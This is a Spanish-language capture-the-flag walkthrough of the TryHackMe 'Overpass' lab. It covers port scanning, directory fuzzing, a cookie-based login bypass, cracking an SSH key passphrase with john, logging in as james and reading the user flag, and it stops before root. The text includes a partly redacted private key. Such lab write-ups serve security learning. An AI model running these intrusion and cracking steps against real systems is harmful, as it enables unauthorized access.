## TryHackMe  <> Overpass

![image](https://github.com/Esevka/CTF/assets/139042999/262f5142-59aa-4483-b9ba-6034c32a93a6)

Enlace Maquina: https://tryhackme.com/room/overpass

Enunciado : 

  - Conseguir Flags(user.txt y root.txt)
  - BONUS --> Conseguir codigo de subscripcion.
---

## Escaneo de puertos (NMAP).

-Segun el ttl obtenito a la hora de lanzar un ping a la maquina victima podriamos decir que es una maquina ---> Linux.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/nmap]
    └─# ping 10.10.181.35 -c1
    PING 10.10.181.35 (10.10.181.35) 56(84) bytes of data.
    64 bytes from 10.10.181.35: icmp_seq=1 ttl=63 time=582 ms
    
    --- 10.10.181.35 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 581.984/581.984/581.984/0.000 ms

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.181.35 -oN open_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 11:29 CET

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

-Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/nmap]
    └─# nmap -p 22,80 -sCV -n -Pn 10.10.181.35 -oN info_ports
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 11:35 CET
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
    |   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
    |_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
    
    80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Overpass
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

-Segun el lauchpad del servicio OpenSSH que tenemos corriendo en el puerto 22.

  ![image](https://github.com/Esevka/CTF/assets/139042999/1bf3f6e8-0dbc-4f89-a3e3-d9f95bca992b)


## Analizamos la informacion obtenida.

-Por el momento tenemos:

  - Maquina Linux (Ubuntu Bionic 18.04)
  - Puertos 80(Http) y 22 (SSH)

-Puerto 80(http).

  - Web titulada Overpass
  
    ![image](https://github.com/Esevka/CTF/assets/139042999/5a258f78-d81a-4cac-959e-930ed30e9ece)

  - En el apartado --> About Us, encontramos posibles usuarios.

    ![image](https://github.com/Esevka/CTF/assets/139042999/2e11e1f2-9212-4358-98cf-3ca15bfc95fa)

  - En el apartado --> Downloads, encontramos la app para diferentes sistemas y el codigo original de la app.

    ![image](https://github.com/Esevka/CTF/assets/139042999/88593c8d-3509-4b30-9414-4a2921f7afc8)

  - Fuzzeamos la web en busqueda de directorios con la ayuda de --> Gobuster.

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
        └─# gobuster dir -u http://10.10.181.35/ -w /usr/share/wordlists/dirb/common.txt -o fuzz
        ===============================================================
        Gobuster v3.6
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        /aboutus              (Status: 301) [Size: 0] [--> aboutus/]
        /admin                (Status: 301) [Size: 42] [--> /admin/]  ---> directorio que nos interesa.
        /css                  (Status: 301) [Size: 0] [--> css/]
        /downloads            (Status: 301) [Size: 0] [--> downloads/]
        /img                  (Status: 301) [Size: 0] [--> img/]
        /index.html           (Status: 301) [Size: 0] [--> ./]

  - Cargamos el directorio y encontramos un panel de login.

    ![image](https://github.com/Esevka/CTF/assets/139042999/28d69fc5-7f5a-42e1-a34a-82551fd94329)

    - Vamos a analizar el codigo web del panel de login, en busca de algun fallo.
   
      ![image](https://github.com/Esevka/CTF/assets/139042999/fd4e81fe-14c3-4ce3-8665-adb8fd007602)

    - Creamos una cookie para ver si podemos saltarnos el panel de login y recargamos la web. Bingo obtenemos una private key.
   
      ![image](https://github.com/Esevka/CTF/assets/139042999/3c07e9ad-3796-46e9-99a3-d1dc1b07ee93)

-Puerto 22(SSH)

-Copiamos la clave a un fichero en nuestra maquina y le damos permiso solo de lectura para nuestro usuario.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
    └─# echo '-----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
    
    LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
    JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
    [...]
    2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
    -----END RSA PRIVATE KEY-----'> id_rsa 

    
    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
    └─# chmod 400 id_rsa                                                                                                                                                    
                                                                                                                                                              
    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
    └─# ls -la
    -r-------- 1 root root 1766 Nov 12 12:42 id_rsa

-Conectamos por ssh utilizando la id_rsa del usuario ---> James
   
    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
    └─# ssh -i id_rsa james@10.10.181.35
    The authenticity of host '10.10.181.35 (10.10.181.35)' can't be established.
    ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
    This host key is known by the following other names/addresses:
        ~/.ssh/known_hosts:11: [hashed name]
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.181.35' (ED25519) to the list of known hosts.
    Enter passphrase for key 'id_rsa': 

Nos pide passphrase para la id_rsa, cosa que no tenemos.

    La "passphrase" (frase de contraseña) para una clave SSH (Secure Shell) es una capa adicional de seguridad que se puede agregar a la clave privada.

-Intentamos Crakear la pass de is_rsa.

  1)Convertimos id_rsa a un formato entendible para john
  
    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
    └─# ssh2john id_rsa > john_id_rsa

  2)Crakeamos john_id_rsa

    ┌──(root㉿kali)-[~kali/…/ctf/try_ctf/overpass/contend]
		└─# john john_idrsa --wordlist=/usr/share/wordlists/rockyou.txt 
		Using default input encoding: UTF-8
		Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
		Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
		Cost 2 (iteration count) is 1 for all loaded hashes
		Will run 3 OpenMP threads
		Press 'q' or Ctrl-C to abort, almost any other key for status
		james----13          (id_rsa)  

  3)Obtenemos session en la maquina victima mediante SSH.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/overpass/files]
    └─# ssh -i id_rsa james@10.10.246.94
    Enter passphrase for key 'id_rsa': 
    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Mon Nov 13 05:59:54 UTC 2023
    
      System load:  0.0                Processes:           88
      Usage of /:   22.3% of 18.57GB   Users logged in:     0
      Memory usage: 12%                IP address for eth0: 10.10.246.94
      Swap usage:   0%
    
    
    47 packages can be updated.
    0 updates are security updates.
    
    
    Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
    james@overpass-prod:~$ whoami
    james

## Obtenemos Flag y elevamos privilegios

-Leemos flag de usuario.

    james@overpass-prod:~$ cat user.txt 
    thm{65c1aaf000506e56-------1e6bf7}





    

  

